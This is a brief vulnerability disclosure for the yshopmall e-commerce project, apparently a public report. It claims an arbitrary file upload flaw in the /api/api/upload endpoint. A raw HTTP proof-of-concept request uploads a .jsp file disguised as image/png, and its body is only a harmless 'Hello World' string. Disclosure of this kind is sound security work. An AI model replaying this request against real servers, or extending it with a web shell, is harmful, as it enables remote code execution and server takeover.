target:https://github.com/guchengwuyue/yshopmall
version: V1.0

The system has an arbitrary file upload vulnerability, which can enable RCE or even take over the server when improperly configured to parse JSP files

POC:
```
POST /api/api/upload HTTP/1.1
Host: 
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfq022FLSjwwBICu2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c11) XWEB/11275 Flue
Sec-Fetch-Site: same-site
Origin: 
Accept: */*
Connection: keep-alive
Authorization: 
Accept-Language: zh-CN,zh;q=0.9
Referer: 
Content-Length: 1200649

------WebKitFormBoundaryfq022FLSjwwBICu2
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: image/png

Hello World !

------WebKitFormBoundaryfq022FLSjwwBICu2
```

